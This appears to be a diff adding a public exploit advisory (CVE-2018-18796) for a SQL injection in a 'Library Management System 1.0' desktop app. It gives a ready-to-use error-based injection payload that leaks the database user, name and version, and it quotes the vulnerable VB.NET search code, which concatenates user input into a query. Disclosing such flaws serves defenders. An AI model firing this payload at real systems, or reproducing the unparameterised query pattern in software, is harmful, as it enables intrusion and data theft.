@@ -1,0 +1,55 @@
+# Exploit Title: Library Management System 1.0 - 'frmListBooks' SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/librarymanagementsystem.zip
+# Version: 1.0
+# Category: Windows
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18796
+
+# POC: 
+# 1)
+# textSearch System.Windows.Forms.TextBox / [SQL]
+# 
+# %' And (SElecT 112 FRom(SELECT CoUNT(*),conCAT((SELecT (ELT(112=112,1))),CONCAT_WS(0x203a20,USEr(),DATABASE(),VERsiON()),FLOOR(RAnD(0)*2))x FRoM INFORmaTION_SCHeMA.PLuGINS GRoUP BY x)a) AnD'%'='
+# 
+# https://1.bp.blogspot.com/-8FBYHFTLhhQ/W9YnCQg0nZI/AAAAAAAAENM/St0sn1IYjDs5kTjvYQNtT_mBmOEv-RaIgCLcBGAs/s1600/sql1.png
+# 
+#[PATH]/forms/frmListofBooks.vb
+#...
+
+Public Class frmListBooks
+
+     Private Sub frmListBooks_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+         sql = "SELECT `AccessionNo`, `BookTitle`, `BookDesc` as 'Description', `Author`, `PublishDate`, `BookPublisher`, `Category`,BookType as 'typeOfBooks', `BookPrice` as 'Price', DeweyDecimal " & _
+         ", Status FROM `tblbooks` b, `tblcategory` c WHERE b.`CategoryId`=c.`CategoryId` "
+         reloadDtg(sql, dtgList)
+     End Sub
+ 
+     Private Sub txtSerach_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtSearch.TextChanged
+         sql = "SELECT `AccessionNo`, `BookTitle`, `BookDesc` as 'Description', `Author`, `PublishDate`, `BookPublisher`, `Category`,BookType as 'typeOfBooks', `BookPrice` as 'Price', DeweyDecimal " & _
+          ", Status FROM `tblbooks` b, `tblcategory` c WHERE b.`CategoryId`=c.`CategoryId`  AND (`BookTitle` Like '%" & txtSearch.Text & "%' OR `Author` Like '%" & txtSearch.Text & "%' OR `AccessionNo` Like '%" & txtSearch.Text & "%')"
+         reloadDtg(sql, dtgList)
+     End Sub
+ 
+     Private Sub btnAdd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAdd.Click
+         Try
+             If dtgList.CurrentRow.Cells(10).Value = "Available" Then
+                 frmBorrow.txtAccesionNumBorrow.Text = dtgList.CurrentRow.Cells(0).Value
+                 Me.Close()
+             Else
+                 MsgBox("The book is already borrowed.", MsgBoxStyle.Exclamation)
+ 
+             End If
+         Catch ex As Exception
+ 
+         End Try
+ 
+     End Sub
+ 
+     Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+         Me.Close()
+     End Sub
+ End Class
